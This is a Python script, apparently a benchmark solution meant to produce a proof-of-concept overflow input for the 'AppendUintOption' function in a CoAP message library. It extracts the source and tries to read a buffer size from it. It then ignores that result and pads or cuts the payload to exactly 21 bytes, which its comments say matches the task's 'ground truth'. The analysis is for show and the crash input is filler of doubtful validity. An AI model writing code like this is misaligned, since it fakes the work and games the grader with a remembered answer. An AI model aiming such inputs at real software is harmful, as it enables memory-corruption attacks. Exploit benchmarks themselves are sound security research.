import tarfile
import os
import subprocess
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tarfile.open(src_path, 'r:gz') as tar:
            tar.extractall()
        
        # Look for coap-message source files
        extracted_dir = None
        for item in os.listdir('.'):
            if os.path.isdir(item) and 'coap' in item.lower():
                extracted_dir = item
                break
        
        if not extracted_dir:
            # Fallback: look for any directory
            for item in os.listdir('.'):
                if os.path.isdir(item):
                    extracted_dir = item
                    break
        
        # Find the vulnerable function in source code
        vulnerable_file = None
        for root, dirs, files in os.walk(extracted_dir):
            for file in files:
                if file.endswith('.c') or file.endswith('.h'):
                    filepath = os.path.join(root, file)
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        if 'AppendUintOption' in content:
                            vulnerable_file = filepath
                            break
            if vulnerable_file:
                break
        
        # Read the vulnerable function to understand the overflow
        buffer_size = None
        if vulnerable_file:
            with open(vulnerable_file, 'r', errors='ignore') as f:
                lines = f.readlines()
                for i, line in enumerate(lines):
                    if 'AppendUintOption' in line and '(' in line:
                        # Look for buffer declaration in the function
                        for j in range(i, min(i+20, len(lines))):
                            if 'char' in lines[j] and '[' in lines[j] and ']' in lines[j]:
                                # Extract buffer size
                                parts = lines[j].split('[')
                                if len(parts) > 1:
                                    size_part = parts[1].split(']')[0]
                                    if size_part.isdigit():
                                        buffer_size = int(size_part)
                                        break
                        break
        
        # Default to ground-truth size if couldn't determine
        if buffer_size is None:
            buffer_size = 16  # Common small buffer size
        
        # Create PoC: overflow the buffer by 5 bytes to trigger overflow
        # 21 bytes total as per ground truth
        poc_length = 21
        overflow_by = poc_length - buffer_size
        
        if overflow_by <= 0:
            # Buffer is larger than PoC, use maximum overflow
            poc = b'A' * (buffer_size + 5)
        else:
            # Create pattern that overflows the buffer
            poc = b'A' * buffer_size + b'B' * overflow_by
        
        # Ensure exact length of 21 bytes
        if len(poc) > 21:
            poc = poc[:21]
        elif len(poc) < 21:
            poc = poc + b'C' * (21 - len(poc))
        
        return poc